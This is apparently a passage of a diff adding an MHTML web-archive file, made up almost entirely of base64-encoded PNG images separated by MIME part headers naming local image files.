+qTc4xVsaTW6zTgZrvQVWtXagZmVmq4W4fjgzc09unh9dy9+fW8hXftrvM9njF5rosnS2VdJWOWlj
+57XWm/8nNr8NbBLSN087m1BHwYyhGOaMQX4l65QcHWVgtv4T5WZVKH8zc1KmAuK/nI7EnRxoT691
+7kk2zlcbPmPFSUbzBdbwuMXOfZTRM3WQCeF2Oya1yk4amBXlrzcKHrZrObsic2Ow70oVfmprHDNC
+LiWS8H4P7koP26uP95cyU9EInBmUnm30uWlFJOY+hlThio1BBmpzBTWcB4/oeaRhuMhEnFcrpCxM
+4InMK1VzCL80D9rwUPPoTnlb5bVAE9d+Xc2FuxYt3JmPHLmLMbj4yPmqPDBjknfAbkaznkI9lyd/
+LS05phpmNH/ZXCfVMs+dl2i+dsLnCqajBOv8oJ2+fLrH8jSpS5BtqG796I9gZmX+z42sHbjScmNy
+oP7onmbgKpjnFOENyTWgs44Qzf+eHAQeT9Gx3G4L1NG3unxvHrgCXV9ZE5ppc/MXx4HRrMTNTcVv
+FQiZVfhnCZg3VAQ2hsK4HubRBtSakcCfJy87dVDP6EGWTcYXPz8tCowanwImGWq2geWveyFYTAtM
+B1Dmx9zwQvhHykXX9xm7En9Rzl76FHK+os4b5MfSRgs5oq+pMWDGUB0sJRVG6/2t4fJj+PJLaW2w
+FkYrT7h+qIWpXiQr5Sb72gsBPZTzFN2AX2jGrszO1LoG1YChOPAUsszm6la5QpoPHZhLi1VqHqoQ
+BQhDYar3lapJwB+tUIceGFlNoqWVYqbFCSme1JKQs5fQhsD44Z6itSS19iaebtTfwwb2v6W7aZnW
+Ogkwsw/W4XgAAAGjSURBVJUhIknRk1p/xIhWAahCLOArKQjZe5rrRVoFVomQ+5XHJmztlK0Z5nbf
+ajRX8VyZFDJQi9vY86pwawQqaHnODSy6lORaftFs0WpMTzcaaEBWw/3Rco3PHvu2WULPWpPfBm7i
+77Xlb+2KE2J8hirEAsIQhOzvzOd8rP2+daxtXVxScyaju9fCrcVwFbhE2bRoqjBYi+E6dR2NqtCj
+LC3EIwxqD7v03QYliFjsLv6ySQJhAJ3BfLC1YUaj3z99+r9LOXWH6KK2AQ0IAwAAgAXwuCoAAIAF
+IAwAAAAW6KkwwNkWAAC4SF8YTA0o8QR91BIBAECrSVwYqrjzlcCdLwCgV6QsDFZVKPegNLQBANAf
+khWGkLmCfPug2um7wqENAICekOY+BpcqmOGuWQU5dlFhZyYAIHnSnDFUH91DFQAAvSVNYSCbNsCd
+LwAAhJCsMFBUqwBUAQDQH9K0MagUdedrvlgYqgAA6BXpC4MAnTsAAATSF2EAAAAQSMo2BgAAACWA
+MAAAAFgAwgAAAGABCAMAAIAF0heGolsZ4BAJANBz/h8xcT5UxWb/EQAAAABJRU5ErkJggk==
+
+------=_NextPart_01D282BC.499D8C10
+Content-Location: file:///C:/D1AFCA88/file8792.files/image004.png
+Content-Transfer-Encoding: base64
+Content-Type: image/png
+
+iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
+jwv8YQUAAAAJcEhZcwAAtmQAAADEAZUzMzgAAAC3SURBVDhPtZFBCsIwEEVnIhS8iquWgivBS4xL
+z6BH0Xt4C1eu3MTeQ3Brx7EMNWkzi6b4IORPwv/MJDAX1H1EQ9UJEA9dwXxeXe7HTg9wuifAlwoh
+1DFmAAM8VYo/I0DoTcz8CxtgBshFYOJ5I2DOGwC0vamNuokxA1oM587pgF1gek8PKCDoABdmwH/x
+VK/9rt5omcQcwVNJDvnmgK8PqvZ6PMIMkL9fqhS4UDGNhsrtd2mZAOAD6UgzjEqth/8AAAAASUVO
+RK5CYIJ=
+
+------=_NextPart_01D282BC.499D8C10
+Content-Location: file:///C:/D1AFCA88/file8792.files/image005.png
+Content-Transfer-Encoding: base64
+Content-Type: image/png
+
+iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
+jwv8YQUAAAAJcEhZcwABLPcAAAsSAVLk80EAAAFaSURBVDhPY6AUMEJpOJiStZ+H5d+viv8M//0Y
+GRh1wYL/Gc4C+eu/cfH1FfdbfQeLQQGKAXNzt4n+/sV8DCiqAhVCAUBDLv9lYrfKmeb4BSrEwASl
+weD3b+Y6uOZ/DMVCbz+yZMxwZwSxQUIgFzH//dUFlocCFANAzgbT//8fzJjl3he2OuwviA9i/2dg
+eAdiA53sBKJhACMMsAGI15geMjAycgINOp45w90KKoXqAmxgVspORUi4MHKC+Iz//k8ES0ABXgNA
+mv+x/D+MFKhNGbM8VkLZYIDXgL/M/+cD7ZQGsf//ZywABmg9WAIJ4AyD2ck7hP6yMr4FsRkZ/lem
+z/DoAEugAZwu+MnOIARlMjD9ZpgFZVIf4PQCKEkz/f+lDmJ/5+C9hp6EYQCnF1j//DFg+s9wBoS5
+v3zBmrRBgGA6IARwGvCbheXCP0YGExD+ysNzByqMBhgYAGfJcL/afF+DAAAAAElFTkSuQmCC
+
+------=_NextPart_01D282BC.499D8C10
+Content-Location: file:///C:/D1AFCA88/file8792.files/image006.png
+Content-Transfer-Encoding: base64
+Content-Type: image/png
+
+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
